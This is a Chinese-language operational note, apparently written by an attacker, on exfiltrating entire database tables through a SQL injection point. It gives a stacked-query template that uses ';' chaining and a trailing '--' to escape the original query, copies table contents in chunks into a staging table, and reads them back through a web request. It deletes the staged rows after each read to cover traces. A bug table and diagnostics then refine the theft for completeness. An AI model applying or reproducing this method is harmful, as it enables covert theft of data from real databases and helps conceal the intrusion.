# 引擎具体形态与实测 Bug 表

## 每块一发的批语句形态(注入点后面有原生尾巴时)

```sql
-- 伪代码:逐块一条 INSERT,整批用 ; 串起,整批末尾 --
IF NOT EXISTS(select 1 from <stage> where [<标记列>]='<前缀>:<tag>:<cid>')
insert into <stage>([<标记列>],[<文本列>],[AddTime])
select '<前缀>:<tag>:<cid>', isnull(x.p,''), getdate()
from (
  select string_agg(v, char(1)) + char(2) + cast(count(*) as nvarchar(20)) as p
  from (
    select top <cnt> <拼接表达式> as v
    from (select row_number() over (order by <排序键>) rn, * from <db>.dbo.[<表>]) z
    where rn > <off> order by rn
  ) q
) x
```

- `<拼接表达式>` = `(isnull(replace(replace(cast([c1] as nvarchar(max)),char(9),' '),char(10),' '),'') + char(9) + …)`
- 排序键优先 `[首列]`;不稳时退**全列** `,` 连接(并列行值相同 ⇒ 不漏不重)
- `<off>` = `i * per`(**不是** `i*per + 1`)

## 回读

```
POST <数据面 URL>
  Action=list, Need=data, page=1, limit=<稍大于组内块数>
```
只收本实例标记前缀开头的行,按 cid 归位;读回后**立即 delete 本单元**。

## 实测 Bug 表(每一条都是被证据教出来的)

| # | 症状 | 机制 | 修法 |
|---|---|---|---|
| ① | 每批全 500 | 派生列没起别名,外层却引用它 | `string_agg(...) as p` |
| ② | 出现字段数翻倍的怪记录 | 块与块拼接未补记录分隔符,块首行粘在上块末行(边界数 = 块数−1,可据此确认) | 拼接时 `"\x01".join(块)` |
| ③ | 每张表固定少 1 行 | `off = i*per + 1` 而 SQL 是 `rn > off` | `off = i*per` |
| ④ | 不知是否完整 | 无服务端自校验 | 尾标 `char(2)+count(*)` + 不符自动重推 3 轮 |
| ⑤ | 大表必断、小表全过 | 读侧"回读整张暂存表",响应体积 ∝ 已暂存量(实测 12MB ✔ / 27MB ✗ / 72MB ✗) | 每组推完立即读回 + 立即擦除 |
| ⑥ | 每项 2 秒内整齐失败 | 复用旧辅助模块时按记忆传参 ⇒ 本地 TypeError | 先读模块真实签名;错误日志打 `type(e).__name__` 而非截断的 traceback |

## 日志/诊断要点

- 异常日志别只打截断的 `traceback` 文本(前 200 字符常只到 `File "..."`,看不到异常类型);
  打 `type(e).__name__ + str(e)[:200]` 一眼定位
- 每单元打印 `完成块/总块`、每表打印 `落盘 / 服务端声称 / 目录 count / 缺块` 四个数;
  看见三个数一致才是真的拿下
- 进度判活:另有一个**独立于日志**的信号(暂存量/产物体积/状态文件 mtime)可在日志停更时判断作业是否还在走
